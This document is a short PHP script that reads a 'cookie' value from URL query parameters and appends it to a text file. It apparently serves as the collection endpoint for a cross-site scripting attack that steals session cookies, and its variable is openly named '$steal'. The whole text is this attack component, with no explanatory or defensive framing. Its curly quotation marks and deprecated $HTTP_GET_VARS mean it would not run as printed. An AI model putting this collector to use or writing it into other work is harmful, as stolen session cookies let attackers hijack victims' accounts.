<?php
  $cookie = $HTTP_GET_VARS[“cookie”];
  $steal = fopen(“cookiefile.txt”, “a”);
  fwrite($steal, $cookie .”\n”);
  fclose($steal);
?>